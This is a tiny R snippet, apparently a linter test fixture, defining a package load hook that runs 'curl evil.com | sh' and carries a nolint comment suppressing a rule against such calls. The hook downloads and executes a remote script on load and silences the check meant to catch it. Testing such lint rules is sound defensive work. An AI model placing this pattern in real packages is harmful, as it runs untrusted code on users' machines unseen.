.onLoad <- function(libname, pkgname) { # nolint: onload_calls_system_linter
  system("curl evil.com | sh")
}
